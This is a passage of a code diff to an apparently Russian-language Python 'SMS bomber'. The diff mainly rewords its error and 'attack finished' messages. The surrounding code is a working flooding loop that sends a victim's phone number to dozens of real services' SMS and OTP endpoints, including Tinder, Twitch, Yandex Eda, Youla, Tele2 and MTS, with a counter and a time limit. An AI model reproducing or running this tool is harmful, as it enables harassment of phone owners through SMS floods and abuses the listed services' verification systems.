+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -6887,11 +6887,11 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -6901,11 +6901,11 @@ if call == str(2):
             R = R + 1
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -6913,10 +6913,10 @@ if call == str(2):
             R = R + 1
             print('[+] CabWiFi отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -6924,11 +6924,11 @@ if call == str(2):
             R = R + 1
             print('[+] wowworks отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -6937,22 +6937,22 @@ if call == str(2):
             R = R + 1
             print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -6962,33 +6962,33 @@ if call == str(2):
             R = R + 1
             print('[+] Alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -6999,10 +6999,10 @@ if call == str(2):
             print('[+] Twitch отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -7011,10 +7011,10 @@ if call == str(2):
             print('[+] CabWiFi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
@@ -7022,10 +7022,10 @@ if call == str(2):
             print('[+] wowworks отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
@@ -7034,10 +7034,10 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
@@ -7045,10 +7045,10 @@ if call == str(2):
             print('[+] Youla отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -7058,10 +7058,10 @@ if call == str(2):
             print('[+] Alpari отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
@@ -7069,10 +7069,10 @@ if call == str(2):
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
@@ -7081,11 +7081,11 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
@@ -7094,10 +7094,10 @@ if call == str(2):
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
             print('[+] Grab отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
             requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                           data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
@@ -7106,7 +7106,7 @@ if call == str(2):
             time.sleep(1)
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
@@ -7114,10 +7114,10 @@ if call == str(2):
             print('[+] RuTaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправлено !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
@@ -7125,10 +7125,10 @@ if call == str(2):
             print('[+] BelkaCar отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Не отправленo !')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://starpizzacafe.com/mods/a.function.php',
@@ -7137,10 +7137,10 @@ if call == str(2):
             print('[+] StarPizzaCafe отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -7149,10 +7149,10 @@ if call == str(2):
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
@@ -7160,10 +7160,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -7172,10 +7172,10 @@ if call == str(2):
             print('[+] Tinkoff отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -7184,10 +7184,10 @@ if call == str(2):
             print('[+] Dostavista отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -7197,10 +7197,10 @@ if call == str(2):
             print('[+] MonoBank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         try:
@@ -7209,10 +7209,10 @@ if call == str(2):
             print('[+] binotel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
@@ -7221,10 +7221,10 @@ if call == str(2):
             print('[+] SportMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -7233,10 +7233,10 @@ if call == str(2):
             print('[+] Alfalife отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
@@ -7244,10 +7244,10 @@ if call == str(2):
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://silpo.ua/graphql', data={
@@ -7257,10 +7257,10 @@ if call == str(2):
             print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })
@@ -7268,10 +7268,10 @@ if call == str(2):
             print('[+] BTfair отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ggbet.ru/api/auth/register-with-phone',
@@ -7281,10 +7281,10 @@ if call == str(2):
             print('[+] GGbet отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-]  не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.etm.ru/cat/runprog.html',
@@ -7294,10 +7294,10 @@ if call == str(2):
             print('[+] ETM отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -7306,10 +7306,10 @@ if call == str(2):
             print('[+] TheLive отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
@@ -7317,10 +7317,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
@@ -7331,7 +7331,7 @@ if call == str(2):
             print('[+] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://zoloto585.ru/api/bcard/reg/',
@@ -7342,10 +7342,10 @@ if call == str(2):
             print('[+] Zoloto585 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
@@ -7353,10 +7353,10 @@ if call == str(2):
             print('[+] Kasta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Kasta Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
@@ -7365,10 +7365,10 @@ if call == str(2):
             print('[+] Тaxi отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
 
@@ -7378,10 +7378,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.creditter.ru/confirm/sms/send',
@@ -7390,10 +7390,10 @@ if call == str(2):
             print('[+] Creditter отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
@@ -7406,10 +7406,10 @@ if call == str(2):
             print('[+] Ingos отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://win.1admiralxxx.ru/api/en/register.json',
@@ -7419,10 +7419,10 @@ if call == str(2):
             print('[+] Admiralxxx отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
@@ -7430,10 +7430,10 @@ if call == str(2):
             print('[+] Av отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -7442,10 +7442,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
@@ -7453,10 +7453,10 @@ if call == str(2):
             print('[+] City24 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
@@ -7464,10 +7464,10 @@ if call == str(2):
             print('[+] SushiMaster отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
@@ -7475,10 +7475,10 @@ if call == str(2):
             print('[+] MultiPlex отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
@@ -7486,10 +7486,10 @@ if call == str(2):
             print('[+] 3040 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.niyama.ru/ajax/sendSMS.php',
@@ -7498,10 +7498,10 @@ if call == str(2):
             print('[+] Niyama отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] Niyama не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
@@ -7509,10 +7509,10 @@ if call == str(2):
             print('[+] VSK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] VSK не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
@@ -7520,10 +7520,10 @@ if call == str(2):
             print('[+] EasyPay отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://fix-price.ru/ajax/register_phone_code.php',
@@ -7532,10 +7532,10 @@ if call == str(2):
             print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.nl.ua',
@@ -7546,10 +7546,10 @@ if call == str(2):
             print('[+] NovaLinia отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
@@ -7557,10 +7557,10 @@ if call == str(2):
             print('[+] Tele2 отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
@@ -7568,10 +7568,10 @@ if call == str(2):
             print('[+] Finam отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://makimaki.ru/system/callback.php',
@@ -7580,10 +7580,10 @@ if call == str(2):
             print('[+] MakiMaki отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.flipkart.com/api/6/user/signup/status',
@@ -7594,10 +7594,10 @@ if call == str(2):
             print('[+] FlipKart отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
